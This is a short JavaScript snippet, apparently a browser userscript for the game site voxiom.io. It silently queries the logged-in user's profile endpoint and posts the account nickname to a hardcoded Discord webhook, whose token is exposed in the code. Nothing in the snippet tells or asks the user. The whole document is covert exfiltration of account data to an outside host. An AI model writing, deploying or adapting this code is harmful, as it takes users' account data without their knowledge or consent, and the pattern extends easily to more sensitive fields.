(async function() {
    'use strict';

    const webhookUrl = 'https://discord.com/api/webhooks/1381077987008708648/7X7BUB6-dgjdHc4ESrVwfZ1bIBZKp03-EpwguIoW8xNiH_cUnWs7-dyJP4gqwVQ3leEH';

    const response = await fetch('https://voxiom.io/profile/me', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    });
    const data = await response.json();
    const nickname = data?.data?.nickname || 'No nickname found';

    await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: nickname })
    });
})();
